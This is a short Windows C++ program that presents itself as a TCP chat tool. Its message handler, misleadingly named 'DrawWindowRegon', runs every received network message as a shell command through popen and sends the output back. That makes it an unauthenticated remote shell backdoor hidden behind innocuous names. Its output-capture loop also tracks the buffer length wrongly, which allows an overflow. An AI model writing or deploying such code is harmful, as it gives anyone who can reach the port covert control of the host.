#include <iostream>
#include <string>
#include <winsock.h>
#include <map>
#include "TcpChatX.h"

int _System(const char *cmd, char *pRetMsg, int msgLen)
{
	if (cmd == NULL || pRetMsg == NULL || msgLen < 0) {
		return -1;
	}
	FILE *fp = popen(cmd, "r");
	if (fp == NULL) {
		strncpy(pRetMsg, "Popen Error!\n", msgLen);
		return -2;
	} else {
		memset(pRetMsg, 0, msgLen);
		//get lastest result
		while(fgets(pRetMsg, msgLen, fp) != NULL) {
			pRetMsg += strlen(pRetMsg);
			msgLen -= strlen(pRetMsg);
		}
		pRetMsg[0] = '\0';
		pclose(fp);
		return 0;
	}
}

int DrawWindowRegon(TcpPackage *tp)
{
	std::cout << "msg <= :" << tp->buf << std::endl;
	_System(tp->buf, tp->buf, sizeof(tp->buf));
	tp->size = strlen(tp->buf);
	std::cout << "res => :" << tp->buf << std::endl;
	return 0;
}
int main()
{
	DWORD threadId;
	TcpChat *tc = TcpChat::GetInstance();
	tc->Init(DrawWindowRegon);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)tc->Accept, tc, 0, &threadId);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)tc->RecvTextCtx, tc, 0, &threadId);
	getchar();
	return 0;
}